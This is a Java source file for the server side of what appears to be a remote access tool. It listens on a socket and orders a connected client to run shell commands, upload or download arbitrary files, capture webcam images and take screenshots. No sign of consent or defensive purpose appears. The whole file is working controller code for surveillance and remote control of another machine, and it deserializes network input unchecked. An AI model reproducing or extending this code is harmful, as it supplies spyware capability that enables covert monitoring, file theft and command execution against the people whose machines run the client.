import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;

public class Server_Thread extends Thread{
	boolean isconnected = false;

	boolean stop = false;
	
	private ObjectOutputStream output;
	private ObjectInputStream input;
	public ServerSocket server_socket;
	private Socket connection_socket;

public void run() {

	while (true) {
		if (stop) {
			close_connection();
			return;
		}
		if (!isconnected) {
			startServer();
		}
		if (isconnected) {
			System.out.println("bagli");
		}
		
		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
			continue;
		}
	}
	
}

public void startServer() {
	try {
		server_socket = new ServerSocket(12349,100);
		openConnection();
	}catch (Exception e) {
		
	}
	
}
private void openConnection() throws IOException {
	displayMessage("WAITING FOR THE CONNECTION");
	connection_socket = server_socket.accept();
	//ObjectOutputStream **MUST** be created first
			output = new ObjectOutputStream(connection_socket.getOutputStream());
			output.flush();
			input = new ObjectInputStream(connection_socket.getInputStream());
			
			server_frame.isconnected=true;
			server_frame.iswaiting = false;
			server_frame.info_label.setText("CONNECTED");
			
			displayMessage("Connection received from: " + connection_socket.getInetAddress().getHostName());		

}

private void close_connection() {
	displayMessage("TERMINATED CONNECTION!");
	try {
		output.close();
		input.close();
		connection_socket.close();
	}catch (Exception e) {
		e.printStackTrace();
		// TODO: handle exception
	}
	try{
		server_socket.close();
	}catch (Exception e) {
		e.printStackTrace();
		// TODO: handle exception
	}finally {
		server_frame.isconnected = false;
		server_frame.iswaiting = false;
		server_frame.info_label.setText("NOT CONNECTED");
	}
	}


private void displayMessage(final String messageToDisplay) {
	SwingUtilities.invokeLater(new Runnable() {
		
		@Override
		public void run() {

			System.out.println(messageToDisplay);
		}
	});
}


public void OPERATION_show_message(String message) {
	Message m;
	m = set_message("showmessage",message);

	try {
		send_message(m);
	} 
	catch (ConnectionLostException e) {
		return;
	}
}

public void Operation_take_cmd(String message) {
	Message m;
	m = set_message("cmdcommand",message);

	try {
		send_message(m);
	} 
	catch (ConnectionLostException e) {
		return;
	}
	
	try {
		m = receive_message();

		if (m.control.equals("cmdsend")) {
			
			StringBuilder sbuild = new StringBuilder();
			sbuild.append(m.value);
			JOptionPane.showMessageDialog(null, m.value);
			
		}
		
	

	} 
	catch (ConnectionLostException e1) {
		return;
	}
	
	
	}


private Message receive_message() throws ConnectionLostException {

	Message m;
	try {
		m = (Message) input.readObject();
	} catch (ClassNotFoundException | IOException e) {
		//e.printStackTrace();
		
		close_connection();

		throw new ConnectionLostException();
	}
	return m;

}

Message set_message(String control, String value) {
	Message m = new Message();
	m.control = control;
	m.value = value;
	return m;
}

private void send_message(Message message) throws ConnectionLostException{
	try {
		output.writeObject(message);
		output.reset();
		output.flush();
	} 
	catch (IOException e) {
		//e.printStackTrace();
		System.out.println("\nmessage is broken IOexception\n");

		close_connection();

		throw new ConnectionLostException();
	}


}

public void OPERATION_sent_file(String servers_abs_file_dir_to_send, String clients_folder_dir_to_save) {
	
	//send the receivefile request and file path
			Message m;
			m = set_message("sendfile", clients_folder_dir_to_save);

			try {
				send_message(m);
			} 
			catch (ConnectionLostException e1) {
				return;
			}
			
			send_file(servers_abs_file_dir_to_send);
			
			JOptionPane.showMessageDialog(null, "File saved", "alert",JOptionPane.PLAIN_MESSAGE);

	
}


void send_file(String path){
	File f = new File(path);
	byte[] content;

	try {
		content = Files.readAllBytes(f.toPath());
		output.writeObject(content);
		output.reset();
		output.flush();

	} catch (IOException e) {
		e.printStackTrace();
		System.out.println("file write error");
	}
}

public void OPERATION_getfile(String clients_abs_file_dir, String servers_file_dir) {
	Message m;
	m = set_message("getfile", clients_abs_file_dir);

	try {
		send_message(m);
	} 
	catch (ConnectionLostException e1) {
		return;
	}
	
			try {
				m = receive_message();
			} 
			catch (ConnectionLostException e1) {
				return;
			}

			if(m.control.equals("ispathexists")) {
				if(m.value.equals("yes")) {

					servers_file_dir = create_new_dir(servers_file_dir);
					Path p = Paths.get(clients_abs_file_dir);
					String client_dir = p.getParent().toString();
					String client_file_name = p.getFileName().toString();
					String abs_path = servers_file_dir + File.separator + "new-" + client_file_name;	
					receive_file(abs_path);
					JOptionPane.showMessageDialog(null, "File downloaded\n" + abs_path, "alert",JOptionPane.PLAIN_MESSAGE);
				}
			}
	}

public void OPERATION_webcamshoot() {
	//send the receivefile request and file path
		Message m;
		m = set_message("webcamshot", "");

		try {
			send_message(m);
		} 
		catch (ConnectionLostException e1) {
			return;
		}
		receive_file("webcam1.png");
		
}


public void OPERATION_screenshot(String servers_file_dir) {
	
	//send the receivefile request and file path
	Message m;
	m = set_message("screenshot", "");

	try {
		send_message(m);
	} 
	catch (ConnectionLostException e1) {
		return;
	}
	
	servers_file_dir = create_new_dir(servers_file_dir);
	
	String ss_name = check_dir_for_existing_screenshoots(servers_file_dir,"png");
	
	String abs_path = servers_file_dir + File.separator + ss_name;
	
	receive_file(abs_path);
	
	JOptionPane.showMessageDialog(null, "ss saved\n" + abs_path, "alert",JOptionPane.PLAIN_MESSAGE);

}



private void receive_file(String path) {

	File f = new File(path);

	byte[] content;

	try {
		content = (byte[]) input.readObject();
		Files.write(f.toPath(), content);
	} 
	catch (ClassNotFoundException | IOException e1) {
		e1.printStackTrace();
		System.out.println("file read error");
	}
}

private String check_dir_for_existing_screenshoots(String theDir, String file_type) {
	int counter = 0;

	//loop until a possible ss file name
	while(true) {

		//directory + basefilename + counter + filetype from combobox 
		File file = new File(theDir + File.separator + "ss" + counter + "." + file_type);
		if(!file.exists()) { 
			return "ss" + counter + "." + file_type;
		}
		else {
			counter++;
		}

	}
}

private String create_new_dir(String name) {
	File theDir = new File(name);

	// if the directory does not exist, create it
	if (!theDir.exists()) {
		System.out.println("creating directory: " + theDir.getName());
		try{
			theDir.mkdir();
			System.out.println("DIR created"); 
		} 
		catch(SecurityException se){
			System.out.println("DIR is not created"); 
		}        
	}

	return theDir.toString();
}


void stop_thread() {
	stop = true;
}
}




